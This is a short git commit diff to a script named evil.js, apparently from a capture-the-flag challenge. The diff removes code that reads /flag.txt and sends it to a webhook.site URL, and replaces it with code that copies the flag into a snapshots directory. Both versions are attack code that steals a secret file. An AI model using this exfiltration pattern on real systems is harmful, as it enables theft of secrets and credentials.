629f9890025a017e336617c946d2f6fe4f67f68b
cyanide666 <cyanide63257@gmail.com>
2026-02-21 20:15:38 +0600

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,10 +1,6 @@
 const fs = require("fs");
-const https = require("https");
 
 try {
   const flag = fs.readFileSync("/flag.txt", "utf8");
-  const url =
-    "https://webhook.site/fb33977a-233c-4537-9090-6d6e7cab26ce?flag=" +
-    encodeURIComponent(flag);
-  https.get(url).on("error", () => {});
+  fs.writeFileSync("/app/snapshots/flag.txt", flag);
 } catch (e) {}
